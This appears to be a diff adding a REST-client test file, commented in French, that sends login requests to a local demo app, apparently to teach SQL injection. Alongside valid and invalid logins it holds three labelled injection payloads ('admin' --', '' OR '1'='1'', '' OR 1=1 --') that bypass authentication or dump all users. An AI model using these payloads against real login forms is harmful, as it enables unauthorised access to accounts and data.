@@ -1,0 +1,48 @@
+@baseUrl = http://localhost:3000
+
+### ✅ Login normal (valide)
+POST {{baseUrl}}
+Content-Type: application/json
+
+{
+  "username": "admin",
+  "password": "secret123"
+}
+
+### ❌ Login normal (invalide)
+POST {{baseUrl}}
+Content-Type: application/json
+
+{
+  "username": "admin",
+  "password": "wrongpassword"
+}
+
+### 🔴 Attaque 1: Bypass authentification avec commentaire SQL
+# Le -- commente le reste de la requête (AND password = ...)
+POST {{baseUrl}}
+Content-Type: application/json
+
+{
+  "username": "admin' --",
+  "password": "nimportequoi"
+}
+
+### 🔴 Attaque 2: Lister TOUS les utilisateurs
+# La condition OR '1'='1' est toujours vraie
+POST {{baseUrl}}
+Content-Type: application/json
+
+{
+  "username": "' OR '1'='1",
+  "password": "' OR '1'='1"
+}
+
+### 🔴 Attaque 3: Bypass avec OR et commentaire
+POST {{baseUrl}}
+Content-Type: application/json
+
+{
+  "username": "' OR 1=1 --",
+  "password": "peu importe"
+}
